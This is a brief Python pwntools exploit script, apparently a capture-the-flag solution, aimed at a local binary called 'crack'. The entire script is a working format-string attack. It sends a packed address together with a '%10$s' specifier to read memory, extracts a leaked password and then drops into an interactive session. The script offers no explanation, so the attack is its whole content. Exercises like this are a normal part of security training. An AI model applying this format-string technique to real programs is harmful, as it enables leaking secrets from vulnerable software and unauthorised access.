from pwn import *

io = process('crack')
io.recvuntil('?')
io.sendline(p32(0x0804A048) + '#' +  '%10$s' + '#')
#print p32(0x804A01C)
io.recvuntil('#')
pwd = u32(io.recvuntil('#')[:4])
print pwd
io.interactive()
